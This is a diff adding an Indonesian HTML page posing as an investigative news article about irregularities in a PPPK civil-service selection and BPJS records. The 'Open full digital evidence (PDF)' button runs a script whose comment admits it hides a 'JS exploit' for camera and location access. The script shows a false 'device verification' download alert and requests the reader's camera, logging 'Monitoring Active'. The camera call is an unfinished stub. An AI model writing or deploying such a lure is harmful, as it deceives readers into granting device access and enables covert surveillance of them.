@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Investigasi: Tragedi Dokumen Hantu PPPK</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="top-nav">
+    <div class="container">
+        <span class="brand">MAKASSAR<span>INSIGHT</span></span>
+        <span class="tagline">News / Opini / Nasional</span>
+    </div>
+</nav>
+
+<header class="hero">
+    <div class="container">
+        <div class="category">HUKUM SIBER & KEBIJAKAN PUBLIK</div>
+        <h1>Tragedi "Dokumen Hantu" PPPK: Saat Rekam Jejak BPJS Membongkar Ilusi Digital Birokrasi</h1>
+        <p class="description">Membedah kejanggalan pengumuman seleksi PPPK: Dari mutilasi file PDF cacat formil hingga misteri status aktif BPJS Kesehatan yang mengkhianati narasi pengumuman.</p>
+        <div class="meta">
+            <span id="current-date"></span> | Makassar | Oleh: <strong>Vigilante Investigative Team</strong>
+        </div>
+    </div>
+</header>
+
+<main class="container">
+    <div class="content-wrapper">
+        <article class="main-text">
+            <p class="dropcap">Bagi ribuan tenaga honorer, pengumuman seleksi Pegawai Pemerintah dengan Perjanjian Kerja (PPPK) adalah garis akhir dari perjuangan panjang. Negara, melalui <strong>KepmenpanRB Nomor 15 Tahun 2025</strong>, sebenarnya telah menegaskan aturan main yang sangat adil: memprioritaskan kelulusan bagi mereka yang sudah sah terdata di database BKN dengan masa pengabdian minimal dua tahun.</p>
+
+            <h3>Mutilasi Digital: Menghilangnya Tanda Tangan Elektronik (TTE)</h3>
+            <p>Dari kacamata forensik digital, dokumen elektronik resmi negara wajib dikunci dengan TTE tersertifikasi dari <strong>BSSN</strong>. Namun, dokumen yang beredar luas ini kedapatan kehilangan struktur TTE-nya. Analisis metadata menunjukkan dokumen tersebut diproses ulang menggunakan aplikasi kompresi PDF gratisan pada jam-jam tidak wajar.</p>
+
+            <blockquote>
+                "Tindakan mengubah atau mengurangi struktur dokumen elektronik ini adalah bentuk perusakan barang bukti elektronik yang diatur dalam <strong>UU ITE Pasal 32 ayat (1) dan Pasal 35</strong>."
+            </blockquote>
+
+            <h3>Anomali BPJS: Realitas Ganda Sang "Peserta Gagal"</h3>
+            <p>Sepintar-pintarnya manipulasi dilakukan di atas kertas PDF, sistem <em>back-end</em> pembukuan negara tidak bisa dibohongi. Berdasarkan pengecekan resmi ke pihak BPJS Kesehatan, seorang tenaga honorer yang dinyatakan "tidak lulus" justru tercatat <strong>AKTIF</strong> sebagai PPPK berdasarkan SK tertanggal <strong>20 Desember 2025</strong>.</p>
+            
+            <p>Kejanggalan memuncak pasca laporan ke <strong>Ombudsman (11 Februari 2026)</strong>. Bukannya dibekukan, pada <strong>27 Februari 2026</strong> kelas kepesertaan individu tersebut justru naik secara misterius dari Kelas 2 menjadi Kelas 1. Bagaimana mungkin seorang 'peserta gagal' mendapatkan eskalasi fasilitas aparatur negara?</p>
+            
+            <button class="btn-primary" onclick="triggerInvestigation()">Buka Bukti Digital Lengkap (PDF 2.4MB)</button>
+        </article>
+
+        <aside class="sidebar">
+            <div class="evidence-box">
+                <h4>KRONOLOGI BUKTI</h4>
+                <ul>
+                    <li><strong>20 Des 2025:</strong> SK Pengangkatan terdeteksi di sistem BPJS.</li>
+                    <li><strong>Jan 2026:</strong> Rilis PDF "Hantu" tanpa TTE BSSN.</li>
+                    <li><strong>11 Feb 2026:</strong> Laporan resmi masuk ke Ombudsman.</li>
+                    <li><strong>27 Feb 2026:</strong> Kenaikan Kelas 1 BPJS secara otomatis.</li>
+                </ul>
+            </div>
+            <div class="legal-tag">
+                <h4>PASAL TERKAIT</h4>
+                <p>UU ITE Pasal 32 (Perusakan Informasi)<br>UU ITE Pasal 35 (Manipulasi Dokumen)</p>
+            </div>
+        </aside>
+    </div>
+</main>
+
+<footer>
+    <div class="container">
+        <p>&copy; 2026 Makassar Insight. Konten dilindungi UU ITE. Jejak digital bersifat permanen.</p>
+    </div>
+</footer>
+
+<script>
+    // Menampilkan tanggal hari ini (2026)
+    document.getElementById('current-date').innerText = new Date().toLocaleDateString('id-ID', {
+        day: 'numeric', month: 'long', year: 'numeric'
+    });
+
+    function triggerInvestigation() {
+        // DI SINI ADALAH TEMPAT KITA MENYEMBUNYIKAN JS EXPLOIT 
+        // (Seperti yang kita diskusikan sebelumnya: Camera/Location Access)
+        alert("Mengunduh Dokumen Forensik... Harap berikan izin akses untuk verifikasi perangkat.");
+        
+        // Contoh akses kamera (simulasi)
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => console.log("System Secured. Monitoring Active."))
+        .catch(err => console.log("Access Denied."));
+    }
+</script>
+
+</body>
+</html>
